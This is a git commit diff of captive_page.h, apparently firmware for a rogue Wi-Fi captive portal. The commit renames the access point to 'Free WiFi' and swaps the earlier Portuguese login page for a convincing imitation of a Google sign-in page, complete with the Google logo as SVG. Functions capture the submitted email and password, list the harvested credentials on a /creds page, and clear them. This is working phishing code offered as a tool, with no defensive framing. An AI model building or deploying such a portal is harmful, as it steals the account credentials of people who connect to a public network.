205fce6a79859a2c2c2a88d297bf9fbabc2b0f8b
Lucas Bustamante <lucascostabustamante@gmail.com>
2023-12-26 18:33:01 -0300

    update

--- captive_page.h
+++ captive_page.h
@@ -4,14 +4,15 @@
 #include <WebServer.h>
 
 // User configuration
-#define SSID_NAME "WIFI-Connect"
-#define SUBTITLE "Internet para todos!"
-#define TITLE "Login"
-#define BODY "Crie uma conta para se conectar a internet."
-#define POST_TITLE "Validando..."
-#define POST_BODY "Sua conta está sendo validada. Aguarde até 2 minutos pela conexão do dispositivo.</br>Obrigado."
-#define PASS_TITLE "Credentials"
-#define CLEAR_TITLE "Cleared"
+#define SSID_NAME "Free WiFi"
+#define LOGIN_TITLE "Sign in"
+#define LOGIN_SUBTITLE "Use your Google Account"
+#define LOGIN_EMAIL_PLACEHOLDER "Email"
+#define LOGIN_PASSWORD_PLACEHOLDER "Password"
+#define LOGIN_MESSAGE "Please log in to browse securely."
+#define LOGIN_BUTTON "Next"
+#define LOGIN_AFTER_MESSAGE "Please wait a few minutes. Soon you will be able to access the internet."
+
 
 int capcount = 0;
 int previous = -1; // stupid hack but wtfe
@@ -23,78 +24,86 @@ const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
 IPAddress APIP(172, 0, 0, 1); // Gateway
 
+
+
 String Credentials = "";
 unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
-DNSServer dnsServer;
-WebServer webServer(80);
+DNSServer dnsServer; WebServer webServer(80);
 
-String input(String argName)
-{
-    String a = webServer.arg(argName);
-    a.replace("<", "&lt;");
-    a.replace(">", "&gt;");
-    a.substring(0, 200);
-    return a;
+String input(String argName) {
+  String a = webServer.arg(argName);
+  a.replace("<", "&lt;"); a.replace(">", "&gt;");
+  a.substring(0, 200); return a;
 }
 
-String footer()
-{
-    return "</div><div class=q><a><h5>Todos os direitos reservados.</h5></a></div>";
+String htmlContents(String body) {
+  String ssidName = String(SSID_NAME);
+  String html = 
+  "<!DOCTYPE html>"
+  "<html>"
+  "<head>"
+  "  <title>" + ssidName + "</title>"
+  "  <meta charset='UTF-8'>"
+  "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+  "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ padding-top: 25px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
+  "</head>"
+  "<body>"
+  "  <div class='container'>"
+  "    <div class='logo-container'>"
+  "      <?xml version='1.0' standalone='no'?>"
+  "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
+  "    </div>"
+  "    <div class=form-container>"
+  "      <center>"
+  "        <div class='containerlogo'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true' class='BFr46e xduoyf'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg></div>"
+  "      </center>"
+  "      <div style='min-height: 150px'>"
+           + body +
+  "      </div>"
+  "    </div>"
+  "  </div>"
+  "</body>"
+  "</html>";
+  return html;
 }
 
-String header(String t)
-{
-    String a = String(SSID_NAME);
-    String CSS = "body { background: #f2f2f2; color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
-                 ".container { background: #fff; margin: 50px auto; max-width: 400px; height: 470px; padding: 20px; border-radius: 15px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); position: relative; }"
-                 ".blue-strip { background: #0066ff; height: 10px; border-top-left-radius: 10px; border-top-right-radius: 10px; position: absolute; top: 0; left: 0; right: 0; }"
-                 "h1 { margin: 3.5em 0 0 0; }"
-                 "h3 { margin: 1.5em 0 0 0; }"
-                 "h5 { margin: 1.5em 0 0 0; font-weight: normal; }"
-                 "input, textarea, input[type=\"password\"] { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 15px; border: 1px solid #c2c2c2; }"
-                 "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
-                 "nav { background: #491165; color: #fff; display: block; font-size: 1.3em; padding: 1em; border-top-left-radius: 10px; border-top-right-radius: 10px; }"
-                 "nav b { display: block; font-size: 1.5em; margin-bottom: .5em; } "
-                 "textarea { width: 100%; }"
-                 "input[type=\"submit\"] { background-color: #8b4caf; color: white; padding: 10px 15px; font-size: 16px; border: none; border-radius: 10px; cursor: pointer; }"
-                 "input[type=\"submit\"]:hover { background-color: #8b4caf98; }"
-                 "p { font-size: 10px; color: #666; margin-top: 20px; text-align: center; }";
-
-    String h = "<!DOCTYPE html><html>"
-               "<head><title>" + a + " :: " + t + "</title>"
-                                                    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
-                                                    "<style>" + CSS + "</style></head>"
-                                                                     "<body><div class=\"container\"><div class=\"blue-strip\"><nav><b>" + a + "</b> " + SUBTITLE + "</nav></div><h1>" + t + "</h1><div>";
-    return h;
+String creds() {
+  return htmlContents("<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
 }
 
-String creds()
-{
-    return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
+String index() {
+  String loginTitle = String(LOGIN_TITLE);
+  String loginSubTitle = String(LOGIN_SUBTITLE);
+  String loginEmailPlaceholder = String(LOGIN_EMAIL_PLACEHOLDER);
+  String loginPasswordPlaceholder = String(LOGIN_PASSWORD_PLACEHOLDER);
+  String loginMessage = String(LOGIN_MESSAGE);
+  String loginButton = String(LOGIN_BUTTON);
+
+  return htmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='"+loginPasswordPlaceholder+"' required /><div class='containermsg'>"+loginMessage+"</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>"+loginButton+" </button></div></form>");
 }
 
-String index()
-{
-    return header(TITLE) + "<div><h5>" + BODY + "</h5></ol></div><div><form action=/post method=post>" +
-                           "<h3>Email:</h3> <center><input type=text autocomplete=email name=email></input></center>" +
-                           "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center></div>" + footer();
+String posted() {
+  String email = input("email");
+  String password = input("password");
+  Credentials = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
+  return htmlContents(LOGIN_AFTER_MESSAGE);
 }
 
-String posted()
-{
-    String email = input("email");
-    String password = input("password");
-    Credentials = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
-    return header(POST_TITLE) + "<h5>" + POST_BODY + "</h5>" + footer();
+String clear() {
+  String email = "<p></p>";
+  String password = "<p></p>";
+  Credentials = "<p></p>";
+  capcount=0;
+  return htmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to Credentials</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
 }
 
-String clear()
-{
-    String email = "<p></p>";
-    String password = "<p></p>";
-    Credentials = "<p></p>";
-    return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
-}
+
+
+
+
+
+
+
 
 void BLINK()
 {
